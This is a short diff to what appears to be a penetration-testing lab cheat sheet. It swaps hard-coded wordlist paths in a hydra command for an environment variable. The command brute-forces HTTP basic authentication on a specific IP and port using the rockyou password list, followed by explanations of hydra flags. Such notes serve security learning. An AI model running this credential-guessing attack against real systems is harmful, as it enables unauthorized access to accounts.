@@ -1,7 +1,7 @@
 > basic auth
 
 ```bash
-hydra -L /usr/share/wordlists/usernames.txt -P /usr/share/wordlists/rockyou.txt 94.237.57.211 http-get / -s 40064 -f -t 16 -V
+hydra -L $WORDLIST_PATH/usernames.txt -P $WORDLIST_PATH/rockyou.txt 94.237.57.211 http-get / -s 40064 -f -t 16 -V
 ```
 - `-l` = login name
 - `-L` = list of usernames
